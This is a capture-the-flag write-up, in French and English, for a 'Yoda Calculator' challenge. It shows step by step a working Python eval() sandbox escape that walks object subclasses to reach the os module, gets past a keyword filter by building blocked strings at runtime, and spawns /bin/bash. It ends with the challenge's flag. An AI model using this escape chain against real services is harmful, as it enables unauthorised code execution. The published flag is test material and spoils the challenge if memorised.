# Yoda Calculator

## Write-up FR

En se connectant avec `netcat`, on accède à une calculatrice interactive :
```python
1+1
>>> 2
1*2
>>> 2
1$&
>>> Error: invalid syntax (<string>, line 1)
```
Le message d'erreur suggère que le service exécute un `eval()` sur notre entrée.
On tente alors d’accéder aux objets internes de Python :
```python
()
>>> ()
().__class__
>>> <type 'tuple'>
```
En exploitant cela, nous essayons d'obtenir un shell en important `os`:
```python
().__class__.__bases__[0].__subclasses__()[59]
>>> <class 'warnings.catch_warnings'>
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__
>>> {..., 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, ...}
```
Nous avons accès au module os, mais il semble qu'un filtre bloque directement certains mots-clés : 
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__['os']
>>> Nope
```
Ce filtre étant simple, il est facile de le contourner en construisant dynamiquement les chaînes bloquées :
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__['o'+'s'].__dict__['SYSTEM'.lower()]('/BIN/BASH'.lower())
whoami 
yoda
ls /home/yoda/39101732858453
flag.txt
```

## Write-up EN

By connecting with netcat, we access an interactive calculator:
```python
1+1
>>> 2
1*2
>>> 2
1$&
>>> Error: invalid syntax (<string>, line 1)
```
The error message suggests that the service is using `eval()` on our input.
We then try to access Python's internal objects:
```python
()
>>> ()
().__class__
>>> <type 'tuple'>
```
By exploiting this, we try to get a shell by importing `os` :
```python
().__class__.__bases__[0].__subclasses__()[59]
>>> <class 'warnings.catch_warnings'>
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__
>>> {..., 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, ...}
```
We gain access to the `os` module, but it seems a filter blocks certain keywords :
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__['os']
>>> Nope
```
Since this filter is simple, it's easy to bypass by dynamically constructing the blocked strings :
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[-5].__dict__['o'+'s'].__dict__['SYSTEM'.lower()]('/BIN/BASH'.lower())
whoami 
yoda
ls /home/yoda/39101732858453
flag.txt
```

## Flag

`polycyber{P4t13nc3_y0u_mu5t_h4v3_my_y0ung_P4d4w4n}`